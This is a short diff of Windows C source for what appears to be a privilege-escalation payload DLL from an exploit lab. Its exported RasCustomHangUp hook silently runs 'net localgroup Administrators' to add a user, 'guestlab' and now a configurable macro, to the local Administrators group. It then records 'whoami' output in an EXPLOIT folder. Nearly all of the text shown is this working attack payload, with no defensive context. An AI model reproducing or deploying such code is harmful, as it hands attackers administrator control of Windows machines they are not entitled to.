@@ -1,5 +1,9 @@
 #include <windows.h>
 
+#ifndef HELPER_USER
+#define HELPER_USER "guestlab"
+#endif
+
 static void write_text_file(const wchar_t* path, const char* text) {
     HANDLE handle = CreateFileW(
         path,
@@ -34,7 +38,7 @@ __declspec(dllexport)
 DWORD WINAPI RasCustomHangUp(void* hconn) {
     (void)hconn;
     WinExec(
-        "cmd /c net localgroup Administrators guestlab /add > "
+        "cmd /c net localgroup Administrators " HELPER_USER " /add > "
         "C:\\Users\\Public\\Desktop\\EXPLOIT\\group_add.txt 2>&1 && "
         "whoami > C:\\Users\\Public\\Desktop\\EXPLOIT\\system.txt",
         SW_HIDE
